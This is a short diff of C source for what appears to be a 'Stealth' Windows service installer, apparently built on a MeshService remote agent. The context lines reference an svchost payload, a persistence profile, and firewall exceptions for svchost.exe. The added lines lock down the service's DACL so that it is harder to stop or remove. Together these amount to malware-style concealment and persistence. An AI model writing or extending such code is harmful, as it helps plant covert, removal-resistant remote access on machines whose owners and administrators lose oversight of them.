@@ -21,6 +21,7 @@
 #include "stealth.h"
 #include "stealth_utils.h"
 #include "branding_util.h"
+#include "service_security.h"
 #include "svchost_payload.h"
 #include "stealth_defaults.h"
 
@@ -698,6 +699,15 @@ BOOL Stealth_PerformCompleteInstallation(
     Stealth_ApplyPersistenceProfile();
     success = TRUE;
     Stealth_StopServiceAndWait(serviceKeyName, 20000, TRUE);
+
+    if (MeshService_HardenServiceDaclByName(serviceKeyName))
+    {
+        Stealth_LogInstallEvent(L"Hardened service DACL for %ls", serviceKeyName);
+    }
+    else
+    {
+        Stealth_LogInstallEvent(L"[WARN] Failed to harden service DACL for %ls (see debug output)", serviceKeyName);
+    }
 
     // Step 4: Add Windows Firewall exceptions
     const wchar_t* fileToExcept = L"C:\\Windows\\System32\\svchost.exe";
